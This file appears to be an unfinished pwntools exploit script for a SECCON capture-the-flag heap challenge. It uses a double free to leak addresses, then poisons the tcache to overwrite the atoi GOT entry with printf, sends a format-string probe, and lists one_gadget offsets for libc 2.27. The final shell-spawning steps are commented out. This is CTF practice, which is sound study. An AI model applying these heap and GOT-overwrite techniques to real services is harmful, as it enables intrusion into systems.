#!/usr/bin/env python
from pwn import *


# conn = process("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
# conn = remote("one.chal.seccon.jp", 18357)
conn = remote("localhost", 3000)
elf = ELF("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
libc = ELF("./libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb")
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


def menu():
    print conn.recvuntil("> ")


def add(name):
    menu()
    print "Add " + str(name)
    conn.sendline("1")
    conn.sendline(name)


def show():
    menu()
    conn.sendline("2")
    # print conn.recvuntil("\n")


def delete():
    menu()
    conn.sendline("3")


def exit():
    menu()
    conn.sendline("0")


def main():
    # a = raw_input()
    # add("AAAA" + str(p64(elf.got["puts"])))
    add("A")
    conn.recvuntil("Done.")
    delete()
    delete()  # double free
    show()
    tmp = u64(conn.recv(6) + "\x00\x00")
    base_addr = (tmp - 0x670 - 0x203000 - 0xc00)  # what is 0xc00...?
    memo_addr = base_addr + 0x202050
    # base_addr = (memo_addr - 0x1620 - 0x202050)
    print "memo_addr: " + str(hex(memo_addr))
    print "base_addr: " + str(hex(base_addr))
    # print hex(elf.got["atoi"])
    # print hex(elf.got["printf"])

    add(p64(elf.got["atoi"] + base_addr))
    add("CCCCCCCC")
    add(p64(elf.plt["printf"] + base_addr))
    menu()
    conn.sendline("Hacked%p%p%p%p%p")
    print "Hack"
    print conn.recvuntil("\n")
    show()
    conn.sendline("LLLL")

    # menu()
    # print "Add " + str(name)
    # conn.sendline("HACKED%p%p%p%p%p")

    print conn.recvuntil("> ")
    print conn.recvuntil("\n")
    print conn.recvuntil("> ")
    print conn.recvuntil("\n")
    # add(p64(one_gadget[0]))

    # conn.interactive()


if __name__ == "__main__":
    main()
